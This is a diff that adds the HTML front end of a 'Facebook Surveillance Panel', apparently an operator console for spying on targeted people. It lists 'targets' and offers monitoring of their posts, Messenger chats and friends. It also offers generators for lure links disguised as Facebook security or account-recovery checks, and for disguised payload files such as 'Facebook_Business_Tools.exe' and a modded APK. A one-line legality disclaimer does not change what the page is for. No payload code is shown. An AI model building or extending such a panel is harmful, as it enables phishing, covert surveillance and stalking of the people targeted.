@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Surveillance Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="warning-banner">
+        <i class="fas fa-exclamation-triangle"></i>
+        DISCLAIMER - Facebook monitoring without someone consent is illegal
+    </div>
+    
+    <div class="dashboard-container">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <h2><i class="fab fa-facebook"></i> Facebook Panel</h2>
+                <a href="dashboard.html" class="back-btn">
+                    <i class="fas fa-arrow-left"></i> Dashboard
+                </a>
+            </div>
+            
+            <div class="sidebar-menu">
+                <div class="menu-section">
+                    <h3><i class="fas fa-eye"></i> Monitoring</h3>
+                    <a href="#" class="menu-item active" data-tab="posts">
+                        <i class="fas fa-newspaper"></i> Posts & Activity
+                    </a>
+                    <a href="#" class="menu-item" data-tab="messages">
+                        <i class="fas fa-comments"></i> Messenger
+                    </a>
+                    <a href="#" class="menu-item" data-tab="friends">
+                        <i class="fas fa-user-friends"></i> Friends
+                    </a>
+                    <a href="#" class="menu-item" data-tab="profile">
+                        <i class="fas fa-id-card"></i> Profile Info
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-cogs"></i> Tools</h3>
+                    <a href="#" class="menu-item" id="fb-generate-link">
+                        <i class="fas fa-link"></i> Generate Link
+                    </a>
+                    <a href="#" class="menu-item" id="fb-generate-file">
+                        <i class="fas fa-file-download"></i> Generate File
+                    </a>
+                    <a href="#" class="menu-item" data-tab="settings">
+                        <i class="fas fa-sliders-h"></i> Settings
+                    </a>
+                </div>
+                
+                <div class="menu-section">
+                    <h3><i class="fas fa-users"></i> Targets</h3>
+                    <div class="targets-list" id="fb-targets-list">
+                        <!-- Targets will be loaded here -->
+                    </div>
+                </div>
+            </div>
+            
+            <div class="sidebar-footer">
+                <div class="connection-status">
+                    <i class="fas fa-circle status-online"></i>
+                    <span>Connected: <strong id="fb-connected-targets">4</strong> targets</span>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="main-content">
+            <div class="content-header">
+                <h1><i class="fab fa-facebook"></i> Facebook Surveillance</h1>
+                <div class="header-actions">
+                    <button class="btn-refresh" id="fb-refresh">
+                        <i class="fas fa-sync-alt"></i> Refresh
+                    </button>
+                    <button class="btn-add-target" id="fb-add-target">
+                        <i class="fas fa-plus"></i> Add Target
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Tab Content -->
+            <div class="tab-content active" id="posts-tab">
+                <div class="fb-activity-container">
+                    <div class="fb-feed">
+                        <h3><i class="fas fa-newspaper"></i> Facebook Feed</h3>
+                        <div class="fb-posts" id="fb-posts">
+                            <!-- Facebook posts will be loaded here -->
+                        </div>
+                    </div>
+                    
+                    <div class="fb-stats">
+                        <h3><i class="fas fa-chart-bar"></i> Activity Statistics</h3>
+                        <div class="stats-cards">
+                            <div class="stat-card-small">
+                                <i class="fas fa-comment"></i>
+                                <div>
+                                    <h4>Comments Today</h4>
+                                    <p class="stat-number">12</p>
+                                </div>
+                            </div>
+                            <div class="stat-card-small">
+                                <i class="fas fa-thumbs-up"></i>
+                                <div>
+                                    <h4>Likes Today</h4>
+                                    <p class="stat-number">47</p>
+                                </div>
+                            </div>
+                            <div class="stat-card-small">
+                                <i class="fas fa-share"></i>
+                                <div>
+                                    <h4>Shares Today</h4>
+                                    <p class="stat-number">5</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Generated Items Panel -->
+            <div class="generated-panel">
+                <h3><i class="fas fa-code"></i> Generated Items</h3>
+                <div class="generated-items-list" id="fb-generated-items">
+                    <!-- Generated Facebook items -->
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook Link Generator Modal -->
+    <div class="modal" id="fb-link-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-facebook"></i> Generate Facebook Link</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Link Type</label>
+                    <select id="fb-link-type">
+                        <option value="security">Security Check</option>
+                        <option value="recovery">Account Recovery</option>
+                        <option value="marketplace">Marketplace Tool</option>
+                        <option value="business">Business Tools</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Target Device</label>
+                    <select id="fb-target-device">
+                        <option value="android">Android</option>
+                        <option value="ios">iPhone</option>
+                        <option value="pc">Computer</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Link Name</label>
+                    <input type="text" id="fb-link-name" placeholder="Facebook Security Check" value="Facebook Account Security">
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="fb-generate-link-btn">
+                        <i class="fas fa-bolt"></i> Generate Link
+                    </button>
+                    <button class="btn-copy" id="fb-copy-link">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook File Generator Modal -->
+    <div class="modal" id="fb-file-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3><i class="fab fa-facebook"></i> Generate Facebook File</h3>
+                <button class="modal-close">&times;</button>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>File Type</label>
+                    <select id="fb-file-type">
+                        <option value="exe">Facebook Tools</option>
+                        <option value="apk">Facebook Lite Mod</option>
+                        <option value="zip">Business Suite</option>
+                        <option value="pdf">Security Guide</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>File Name</label>
+                    <input type="text" id="fb-file-name" placeholder="Facebook_Security_Tools.exe" value="Facebook_Business_Tools.exe">
+                </div>
+                <div class="form-group">
+                    <label>File Size (MB)</label>
+                    <input type="range" id="fb-file-size" min="1" max="100" value="52">
+                    <span id="fb-size-value">52 MB</span>
+                </div>
+                <div class="form-actions">
+                    <button class="btn-generate" id="fb-generate-file-btn">
+                        <i class="fas fa-bolt"></i> Generate File
+                    </button>
+                    <button class="btn-download" id="fb-download-file">
+                        <i class="fas fa-download"></i> Download File
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="platform.js"></script>
+    <script>
+        // Facebook specific initialization
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeFacebookPanel();
+        });
+    </script>
+</body>
+</html>
